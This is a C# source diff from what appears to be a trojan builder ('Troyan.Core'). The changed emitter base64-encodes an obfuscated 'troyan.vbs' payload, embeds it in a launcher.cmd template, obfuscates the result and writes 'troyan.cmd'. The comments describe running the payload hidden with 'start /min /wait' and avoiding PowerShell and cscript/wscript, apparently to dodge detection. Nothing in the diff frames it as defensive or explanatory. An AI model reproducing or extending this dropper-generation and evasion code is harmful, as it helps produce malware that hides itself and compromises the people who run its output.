@@ -1,10 +1,17 @@
 using Commons;
+using System.Text;
 
 namespace Troyan.Core;
 
-/// <summary>Writes <c>nonobfuscated.cmd</c> (raw) then final <c>troyan.cmd</c> via <see cref="ITroyanCmdObfuscator"/>.</summary>
+/// <summary>
+/// Writes <c>nonobfuscated.cmd</c> / <c>troyan.cmd</c> that embed the final obfuscated <c>troyan.vbs</c>
+/// and run it hidden via <c>start /min /wait</c> (no PowerShell, no cscript/wscript).
+/// Must run after <see cref="ITroyanPlainVbsEmitter"/>.
+/// </summary>
 public sealed class TroyanPlainCmdEmitter : ITroyanPlainCmdEmitter
 {
+    private const int Base64LineWidth = 76;
+
     private readonly ITroyanCmdObfuscator _obfuscator;
 
     public TroyanPlainCmdEmitter(ITroyanCmdObfuscator obfuscator) => _obfuscator = obfuscator;
@@ -15,17 +22,20 @@ public sealed class TroyanPlainCmdEmitter : ITroyanPlainCmdEmitter
         if (!File.Exists(templatePath))
             throw new FileNotFoundException("launcher.cmd not found for plain CMD.", templatePath);
 
-        var bodyPs1 = layout.BodyPs1Debug;
-        if (!File.Exists(bodyPs1))
-            throw new FileNotFoundException("body.debug.ps1 must be built before plain CMD.", bodyPs1);
+        var vbsFinal = layout.TroyanOutputVbs;
+        if (!File.Exists(vbsFinal))
+            throw new FileNotFoundException(
+                "Final troyan.vbs must be built before CMD (embed obfuscated VBS).",
+                vbsFinal);
 
-        var b64 = Convert.ToBase64String(File.ReadAllBytes(bodyPs1));
+        var b64 = Convert.ToBase64String(File.ReadAllBytes(vbsFinal));
+        var wrapped = WrapBase64(b64, Base64LineWidth);
         var template = File.ReadAllText(templatePath);
         const string placeholder = "0102";
         if (!template.Contains(placeholder, StringComparison.Ordinal))
             throw new InvalidOperationException("launcher.cmd must contain the 0102 placeholder.");
 
-        var plain = template.Replace(placeholder, b64, StringComparison.Ordinal);
+        var plain = template.Replace(placeholder, wrapped, StringComparison.Ordinal);
         var final = _obfuscator.Obfuscate(plain);
 
         var dir = Path.GetDirectoryName(layout.TroyanOutputCmd);
@@ -34,5 +44,19 @@ public sealed class TroyanPlainCmdEmitter : ITroyanPlainCmdEmitter
 
         File.WriteAllText(layout.TroyanOutputCmdNonObfuscated, plain);
         File.WriteAllText(layout.TroyanOutputCmd, final);
+    }
+
+    private static string WrapBase64(string b64, int width)
+    {
+        var sb = new StringBuilder(b64.Length + b64.Length / width + 8);
+        for (var i = 0; i < b64.Length; i += width)
+        {
+            var len = Math.Min(width, b64.Length - i);
+            if (sb.Length > 0)
+                sb.AppendLine();
+            sb.Append(b64, i, len);
+        }
+
+        return sb.ToString();
     }
 }
